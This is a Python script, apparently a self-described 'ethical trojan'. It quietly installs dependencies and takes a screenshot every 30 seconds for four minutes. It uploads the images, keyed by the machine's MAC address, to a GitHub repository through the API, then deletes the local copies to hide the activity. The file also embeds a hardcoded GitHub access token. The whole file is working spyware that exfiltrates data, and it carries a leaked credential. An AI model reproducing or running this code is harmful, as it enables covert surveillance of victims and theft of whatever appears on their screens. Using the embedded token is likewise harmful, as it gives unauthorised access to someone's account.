import platform
import psutil
import requests
import base64
import json
import os
import subprocess
import sys
import time
import pyautogui
import shutil

GITHUB_TOKEN = "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"
REPO_OWNER = "jonas638"
REPO_NAME = "ethicaltrojan"
FOLDER_PATH = "screenshots"

def install(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

required_packages = ['pyautogui', 'pillow', 'pyscreeze']
for package in required_packages:
    try:
        __import__(package)
    except ImportError:
        print(f"{package} not found. Installing...")
        install(package)

def get_mac_address():
    for interface, addrs in psutil.net_if_addrs().items():
        for addr in addrs:
            if addr.family == psutil.AF_LINK:
                mac_address = addr.address
                if mac_address and mac_address != "00:00:00:00:00:00":
                    return mac_address.replace(":", "-").lower()
    return "00-00-00-00-00-00"

def take_screenshots(duration=300, interval=30):
    mac_address = get_mac_address()
    folder_name = f"{mac_address}-screenshots"
    if not os.path.exists(folder_name):
        os.makedirs(folder_name)

    start_time = time.time()
    screenshot_counter = 1

    while (time.time() - start_time) < duration:
        screenshot = pyautogui.screenshot()
        file_path = os.path.join(folder_name, f"screenshot_{screenshot_counter}.png")
        screenshot.save(file_path)
        print(f"Screenshot saved as {file_path}")
        screenshot_counter += 1
        time.sleep(interval)

    return folder_name

def upload_folder_to_github(folder_path, mac_address):
    folder_name = f"{mac_address}-screenshots"
    for file_name in os.listdir(folder_path):
        if file_name.endswith(".png"):
            file_path = os.path.join(folder_path, file_name)

            with open(file_path, 'rb') as file:
                content = file.read()

            encoded_content = base64.b64encode(content).decode()

            upload_path = f"{FOLDER_PATH}/{folder_name}/{file_name}"
            url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{upload_path}"

            headers = {
                "Authorization": f"token {GITHUB_TOKEN}",
                "Accept": "application/vnd.github.v3+json",
            }

            response = requests.get(url, headers=headers)
            if response.status_code == 200:
                sha = response.json()["sha"]
                message = "Updating screenshot"
            else:
                sha = None
                message = "Uploading screenshot"

            payload = {
                "message": message,
                "content": encoded_content,
            }
            if sha:
                payload["sha"] = sha

            response = requests.put(url, headers=headers, data=json.dumps(payload))

            if response.status_code in [200, 201]:
                print(f"File '{upload_path}' uploaded successfully!")
            else:
                print(f"Failed to upload file: {response.status_code}")
                print(response.json())

def delete_folder(folder_path):
    """
    Delete the folder and all its contents after uploading.
    """
    try:
        shutil.rmtree(folder_path)
        print(f"Folder {folder_path} deleted successfully.")
    except Exception as e:
        print(f"Failed to delete {folder_path}: {e}")

def main():
    mac_address = get_mac_address()
    folder_name = take_screenshots(duration=240, interval=30)
    upload_folder_to_github(folder_name, mac_address)
    delete_folder(folder_name)

if __name__ == "__main__":
    main()
